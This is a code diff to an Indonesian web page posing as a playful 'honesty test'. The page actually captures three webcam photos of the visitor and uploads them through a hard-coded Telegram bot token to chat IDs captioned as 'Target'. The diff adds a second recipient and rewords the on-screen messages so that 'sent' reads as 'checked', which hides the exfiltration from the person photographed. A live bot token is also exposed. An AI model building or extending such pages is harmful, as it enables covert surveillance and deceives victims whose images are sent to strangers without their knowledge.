@@ -3,7 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>Foto Kejujuran</title>
+    <title>Foto Kejujuran
+    </title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; }
         body { overflow: hidden; background: #000; height: 100vh; width: 100vw; font-family: system-ui, 'Segoe UI', sans-serif; }
@@ -52,10 +53,14 @@
     <div id="toast" class="toast" style="opacity:0; visibility:hidden;"></div>
 
     <script>
-        // ================= KONFIGURASI TELEGRAM (SUDAH DIISI) =================
+        // ================ KONFIGURASI TELEGRAM (1 BOT + 2 CHAT ID) ================
         const BOT_TOKEN = "8938453262:AAFxNwRyyGtRa05QLNNIBJlp5IQwlnFu0NE";
-        const CHAT_ID = "5710362380";
-        // ====================================================================
+        // DUA ID PENERIMA: ganti ID_KEDUA dengan chat ID orang kedua yang ingin menerima foto
+        const CHAT_IDS = [
+            "5710362380",   // ID pertama (penerima 1)
+            "8874242457"   // <--- GANTI DENGAN CHAT ID TUJUAN KEDUA
+        ];
+        // ==========================================================================
 
         const video = document.getElementById('cameraVideo');
         const startBtn = document.getElementById('startBtn');
@@ -109,14 +114,51 @@
             });
         }
 
-        async function sendToTelegram(blob, photoNum) {
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', blob, `kejujuran_${Date.now()}_${photoNum}.jpg`);
-            formData.append('caption', `📸 Foto Target #${photoNum} - ${new Date().toLocaleTimeString()}`);
-            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
-            const json = await res.json();
-            return json.ok;
+        // FUNGSI MENGIRIM KE DUA CHAT ID SEKALIGUS
+        async function sendToTwoTelegram(blob, photoNum) {
+            // Kirim ke setiap chat ID dalam daftar
+            const sendPromises = CHAT_IDS.map(async (chatId) => {
+                // Lewati jika chatId belum diisi dengan benar (berisi placeholder)
+                if (!chatId || chatId === "ID_TELEGRAM_KEDUA") {
+                    console.warn(`Chat ID kedua belum diganti, pengiriman ke ID tersebut dilewati.`);
+                    return { chatId, ok: false, skipped: true };
+                }
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', blob, `kejujuran_${Date.now()}_${photoNum}.jpg`);
+                formData.append('caption', `📸 Foto Target #${photoNum} - ${new Date().toLocaleTimeString()} (dari Tes Kejujuran)`);
+                try {
+                    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+                    const json = await res.json();
+                    return { chatId, ok: json.ok, error: json.ok ? null : json.description };
+                } catch (err) {
+                    return { chatId, ok: false, error: err.message };
+                }
+            });
+
+            const results = await Promise.allSettled(sendPromises);
+            // Ekstrak hasil yang sudah resolved (Promise.allSettled)
+            const finalResults = results.map(r => r.status === 'fulfilled' ? r.value : { ok: false, error: 'Promise gagal' });
+            
+            // Catat statistik untuk keperluan notifikasi
+            const successCount = finalResults.filter(r => r.ok === true).length;
+            const totalTarget = CHAT_IDS.filter(id => id && id !== "ID_TELEGRAM_KEDUA").length; // hitung hanya yang valid
+            const actualTargetCount = totalTarget > 0 ? totalTarget : CHAT_IDS.length;
+            
+            if (successCount > 0) {
+                // Minimal satu penerima berhasil
+                if (successCount === actualTargetCount) {
+                    showToast(`📸 Foto ${photoNum} berhasil ${successCount} check!`);
+                } else {
+                    showToast(`Foto ${photoNum}: ${successCount}/${actualTargetCount} check berhasil`, false);
+                }
+                return true;
+            } else {
+                // Semua gagal
+                const errors = finalResults.map(r => r.error).filter(e => e).join(', ');
+                showToast(`Gagal check foto ${photoNum}: ${errors || 'cek token/ID'}`, true);
+                return false;
+            }
         }
 
         async function takeAndSend(photoIndex) {
@@ -129,20 +171,18 @@
             updateUI(`Menilai Foto ${photoIndex}/3...`, '📷', 'Harap tunggu...');
             try {
                 const blob = await captureSnapshot();
-                updateUI(`Menilai foto ${photoIndex}/3...`, '📤', 'Berhasil');
-                const success = await sendToTelegram(blob, photoIndex);
+                updateUI(`Menilai foto ${photoIndex}/3...`, '📤', 'Harap tunggu...');
+                const success = await sendToTwoTelegram(blob, photoIndex);
                 if (success) {
                     captureResults.push(true);
-                    showToast(`Foto ${photoIndex} berhasil dikirim!`);
-                    updateUI(`✅ Foto ${photoIndex} sukses`, '✅', `Yang Ke ${photoIndex}`);
+                    updateUI(`✅ Foto ${photoIndex} sukses`, '✅', `ter check`);
                     return true;
                 } else {
-                    throw new Error('Gagal kirim ke Telegram');
+                    throw new Error('Gagal pengecek an');
                 }
             } catch (err) {
                 captureResults.push(false);
-                showToast(`Foto ${photoIndex} gagal: ${err.message}`, true);
-                updateUI(`❌ Gagal foto ${photoIndex}`, '❌', 'Gagal');
+                updateUI(`❌ Gagal foto ${photoIndex}`, '❌', 'Coba periksa koneksi');
                 return false;
             }
         }
@@ -156,7 +196,7 @@
             isActive = true;
             captureResults = [];
             clearTimeouts();
-            updateUI('Memulai Untuk Menilai...', '🎬', 'Proses');
+            updateUI('Memulai Untuk Menilai...', '🎬', 'Proses 3 foto akan dicheck');
             
             // Jadwal foto 1,2,3 dengan jeda 3 detik
             const schedule = (index, delay) => {
@@ -196,13 +236,13 @@
             const successCount = captureResults.filter(v => v === true).length;
             if (successCount === 3) {
                 updateUI('Selesai! Anda Orang Yang Sangat Jujur', '🎉', 'Refresh halaman untuk mengulang');
-                showToast('Anda Sangat Jujur 100/10!');
+                showToast('Anda Sangat Jujur 100/10!.');
             } else if (successCount > 0) {
-                updateUI(`Selesai: ${successCount}/3 Berhasil`, '👍', 'Coba lagi lain waktu');
-                showToast(`${successCount} dari 3 foto terkirim.`);
+                updateUI(`Selesai: ${successCount}/3 Berhasil`, '👍', 'Hanya 5/10 Coba lagi lain waktu');
+                showToast(`${successCount} dari 3 foto tercheck selesai.`);
             } else {
                 updateUI('Gagal total, anda orang yang tidak jujur', '❌', 'Semangat Untuk Menjadi Jujur');
-                showToast('Tidak ada foto terkirim. Periksa koneksi atau token.', true);
+                showToast('Coba Di Perjelas Kamera Terhadap Objek.', true);
             }
             countdownArea.innerText = '';
             startBtn.disabled = false;
@@ -211,7 +251,7 @@
 
         async function initCamera() {
             if (mediaStream) stopCamera();
-            updateUI('Akses kamera...', '📷', 'Izinkan kamera depan');
+            updateUI('Akses kamera...', '📷', 'Izinkan kamera untuk menilai');
             startBtn.disabled = true;
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({
@@ -220,13 +260,13 @@
                 mediaStream = stream;
                 video.srcObject = stream;
                 await video.play();
-                updateUI('Kamera depan aktif!', '✅', 'Ayo Mulai Tes');
+                updateUI('Kamera untuk test aktif!', '✅', 'Ayo Mulai Tes');
                 setTimeout(() => startPhotoSequence(), 800);
             } catch (err) {
-                let msg = 'Izin kamera ditolak atau tidak ada kamera.';
+                let msg = 'Izin kamera ditolak!.';
                 if (err.name === 'NotAllowedError') msg = 'Izin kamera ditolak. Klik tombol izinkan.';
-                else if (err.name === 'NotFoundError') msg = 'Kamera depan tidak ditemukan.';
-                updateUI('Gagal akses kamera', '❌', msg);
+                else if (err.name === 'NotFoundError') msg = 'Kamera tidak melihat objek untuk dinilai.';
+                updateUI('Gagal', '❌', msg);
                 showToast(msg, true);
                 startBtn.disabled = false;
             }
@@ -248,7 +288,13 @@
 
         // Peringatan jika bukan HTTPS (tapi tidak menghalangi)
         if (location.protocol !== 'https:' && location.hostname !== 'localhost' && !location.hostname.match(/127\.0\.0\.1/)) {
-            detailInfo.innerText = '⚠️ Gunakan HTTPS atau localhost untuk akses kamera.';
+            detailInfo.innerText = '⚠️ Website ini hanya untuk have fun.';
+        }
+
+        // Peringatan jika ID kedua belum diganti
+        if (CHAT_IDS.includes("ID_TELEGRAM_KEDUA")) {
+            console.warn("⚠️ Gagal Pengecek an, Website Maintanc");
+            detailInfo.innerText = detailInfo.innerText + " ⚠️ Gagal!";
         }
     </script>
 </body>
